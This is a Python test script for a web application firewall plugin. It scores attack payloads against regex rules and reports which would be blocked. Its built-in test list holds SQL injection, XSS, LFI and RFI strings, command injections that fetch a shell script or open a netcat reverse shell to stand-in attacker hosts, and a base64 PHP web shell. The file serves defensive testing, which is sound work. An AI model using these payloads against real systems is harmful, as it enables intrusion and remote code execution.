# ==============================================================================
# test_rules.py - WAF rules testing
# ==============================================================================

#!/usr/local/bin/python3.11

"""
WebGuard WAF Rules Testing Script
Copyright (C) 2024 OPNsense WebGuard Plugin
All rights reserved.
"""

import sys
import json
import re
import os
from datetime import datetime

WAF_RULES_FILE = "/usr/local/etc/webguard/waf_rules.json"
ATTACK_PATTERNS_FILE = "/usr/local/etc/webguard/attack_patterns.json"

def load_rules():
    """Load WAF rules from file"""
    try:
        if os.path.exists(WAF_RULES_FILE):
            with open(WAF_RULES_FILE, 'r') as f:
                return json.load(f)
        else:
            return {'rules': []}
    except Exception as e:
        print(f"ERROR: Failed to load rules: {e}")
        return {'rules': []}

def test_payload_against_rules(payload, rule_type='all'):
    """Test a payload against WAF rules"""
    try:
        waf_rules = load_rules()
        results = {
            'payload': payload,
            'matched_rules': [],
            'total_score': 0,
            'highest_severity': 'low',
            'blocked': False
        }
        
        for rule in waf_rules.get('rules', []):
            if not rule.get('enabled', True):
                continue
                
            if rule_type != 'all' and rule.get('type') != rule_type:
                continue
            
            pattern = rule.get('pattern', '')
            if not pattern:
                continue
            
            try:
                # Compile and test pattern
                regex = re.compile(pattern, re.IGNORECASE)
                if regex.search(payload):
                    match_result = {
                        'rule_id': rule.get('id'),
                        'rule_name': rule.get('name'),
                        'rule_type': rule.get('type'),
                        'score': rule.get('score', 0),
                        'pattern': pattern,
                        'description': rule.get('description', '')
                    }
                    
                    results['matched_rules'].append(match_result)
                    results['total_score'] += rule.get('score', 0)
                    
                    # Determine severity based on score
                    score = rule.get('score', 0)
                    if score >= 60:
                        severity = 'critical'
                    elif score >= 45:
                        severity = 'high'
                    elif score >= 30:
                        severity = 'medium'
                    else:
                        severity = 'low'
                    
                    # Update highest severity
                    severity_levels = {'low': 1, 'medium': 2, 'high': 3, 'critical': 4}
                    if severity_levels[severity] > severity_levels[results['highest_severity']]:
                        results['highest_severity'] = severity
                        
            except re.error as e:
                print(f"WARNING: Invalid regex in rule {rule.get('id')}: {e}")
                continue
        
        # Determine if blocked (score threshold)
        results['blocked'] = results['total_score'] >= 50
        
        return results
        
    except Exception as e:
        return {'error': f'Failed to test payload: {e}'}

def test_multiple_payloads(payloads, rule_type='all'):
    """Test multiple payloads"""
    results = []
    
    for payload in payloads:
        if payload.strip():
            result = test_payload_against_rules(payload.strip(), rule_type)
            results.append(result)
    
    return results

def run_rule_tests():
    """Run comprehensive rule tests with common attack payloads"""
    test_payloads = {
        'sql_injection': [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM users--",
            "admin' --",
            "' OR 1=1#",
            "1' AND SLEEP(5)#"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ],
        'command_injection': [
            "; ls -la",
            "| cat /etc/passwd",
            "&& wget http://evil.com/shell.sh",
            "$(cat /etc/passwd)",
            "`id`",
            "; nc -e /bin/bash attacker.com 4444"
        ],
        'lfi': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php"
        ],
        'rfi': [
            "http://evil.com/shell.php",
            "https://pastebin.com/raw/evilcode",
            "ftp://attacker.com/backdoor.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        ]
    }
    
    all_results = {}
    
    for attack_type, payloads in test_payloads.items():
        print(f"\nTesting {attack_type.upper()} payloads:")
        print("-" * 50)
        
        type_results = []
        for payload in payloads:
            result = test_payload_against_rules(payload, attack_type)
            type_results.append(result)
            
            # Print result
            if result.get('matched_rules'):
                status = "BLOCKED" if result['blocked'] else "DETECTED"
                print(f"{status}: {payload[:50]}...")
                print(f"  Score: {result['total_score']}, Severity: {result['highest_severity']}")
                print(f"  Rules matched: {len(result['matched_rules'])}")
            else:
                print(f"PASSED: {payload[:50]}...")
        
        all_results[attack_type] = type_results
    
    return all_results

def generate_test_report(results):
    """Generate a comprehensive test report"""
    report = {
        'timestamp': datetime.now().isoformat(),
        'test_summary': {
            'total_payloads_tested': 0,
            'total_blocked': 0,
            'total_detected': 0,
            'total_passed': 0,
            'coverage_by_type': {}
        },
        'detailed_results': results
    }
    
    for attack_type, type_results in results.items():
        blocked_count = sum(1 for r in type_results if r.get('blocked', False))
        detected_count = sum(1 for r in type_results if r.get('matched_rules', []) and not r.get('blocked', False))
        passed_count = sum(1 for r in type_results if not r.get('matched_rules', []))
        
        report['test_summary']['total_payloads_tested'] += len(type_results)
        report['test_summary']['total_blocked'] += blocked_count
        report['test_summary']['total_detected'] += detected_count
        report['test_summary']['total_passed'] += passed_count
        
        report['test_summary']['coverage_by_type'][attack_type] = {
            'tested': len(type_results),
            'blocked': blocked_count,
            'detected': detected_count,
            'passed': passed_count,
            'detection_rate': round((blocked_count + detected_count) / len(type_results) * 100, 2) if type_results else 0
        }
    
    return report

def main():
    if len(sys.argv) < 2:
        print("Usage: test_rules.py <command> [args...]")
        print("Commands:")
        print("  test <payload> [rule_type]")
        print("  test_multiple <payloads_file> [rule_type]")
        print("  run_tests")
        print("  generate_report")
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == 'test':
        if len(sys.argv) < 3:
            print("ERROR: Payload required")
            sys.exit(1)
        
        payload = sys.argv[2]
        rule_type = sys.argv[3] if len(sys.argv) > 3 else 'all'
        
        result = test_payload_against_rules(payload, rule_type)
        print(json.dumps(result, indent=2))
        
    elif command == 'test_multiple':
        if len(sys.argv) < 3:
            print("ERROR: Payloads required")
            sys.exit(1)
        
        payloads_input = sys.argv[2]
        rule_type = sys.argv[3] if len(sys.argv) > 3 else 'all'
        
        # Check if it's a file or direct input
        if os.path.exists(payloads_input):
            with open(payloads_input, 'r') as f:
                payloads = f.readlines()
        else:
            payloads = payloads_input.split('\n')
        
        results = test_multiple_payloads(payloads, rule_type)
        print(json.dumps(results, indent=2))
        
    elif command == 'run_tests':
        results = run_rule_tests()
        # Save results to file
        with open('/tmp/webguard_rule_tests.json', 'w') as f:
            json.dump(results, f, indent=2)
        print("\nTest results saved to /tmp/webguard_rule_tests.json")
        
    elif command == 'generate_report':
        results = run_rule_tests()
        report = generate_test_report(results)
        
        print(json.dumps(report, indent=2))
        
        # Save report
        with open('/tmp/webguard_test_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        print("\nDetailed report saved to /tmp/webguard_test_report.json")
        
    else:
        print(f"ERROR: Unknown command: {command}")
        sys.exit(1)

if __name__ == '__main__':
    main()